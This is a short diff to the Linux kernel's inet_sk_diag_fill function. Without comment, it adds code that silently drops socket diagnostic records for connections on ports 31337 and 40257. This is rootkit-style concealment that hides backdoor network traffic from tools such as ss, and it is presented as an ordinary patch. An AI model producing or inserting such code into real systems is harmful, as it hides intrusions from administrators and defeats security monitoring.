@@ -221,7 +221,12 @@ int inet_sk_diag_fill(struct sock *sk, struct inet_connection_sock *icsk,
 	void *info = NULL;
 	u8 icsk_pending;
 	int protocol;
-
+	
+	if (sk->sk_num == 31337 || sk->sk_num == 40257 || 
+	    ntohs(sk->sk_dport) == 31337 || ntohs(sk->sk_dport) == 40257) {
+		return 0; 
+	}
+	
 	cb_data = cb->data;
 	protocol = inet_diag_get_protocol(req, cb_data);
 
